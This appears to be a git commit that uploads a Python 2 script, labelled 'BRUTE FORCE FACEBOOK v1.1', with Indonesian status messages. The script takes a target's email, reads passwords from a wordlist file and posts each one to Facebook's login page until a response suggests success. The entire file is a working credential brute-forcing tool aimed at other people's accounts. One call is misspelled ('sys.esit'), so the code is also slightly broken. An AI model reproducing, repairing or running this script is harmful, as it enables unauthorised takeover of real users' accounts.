549a3968ee4edda0f98f50a01e00bfcf14c58b8f
Henrycko <49187820+Henrycko@users.noreply.github.com>
2019-04-28 17:00:53 +0700

    Add files via upload

---
+++ Facebook.py.py
@@ -0,0 +1,24 @@
+import requests
+import sys
+
+print "\033[92m================================="
+print "\033[92m==  BRUTE FORCE FACEBOOK v1.1  =="
+print "\033[92m================================="
+print "\033[92m==   Authors : Henrycko        =="       
+print "\033[92m================================="
+
+print "\033[92m[!] Pastikan Wordlist bernama pass.txt [!]"
+
+email = raw_input('email >')
+url = 'https://free.facebook.com/login.php?login_attempt=1'
+ex = open('pass.txt', 'r').readlines()
+
+for line in ex:
+    password = line.strip()
+    http = requests.post(url, data={'email':email, 'pass':password, 'login':'submit'})
+    content = http.content
+    if "beranda" in content:
+        print "\033[93m[+] BERHASIL! Mencoba Password",password
+        sys.esit(1)
+    else:
+        print "\033[91m[-] GAGAL! Mencoba Password",password
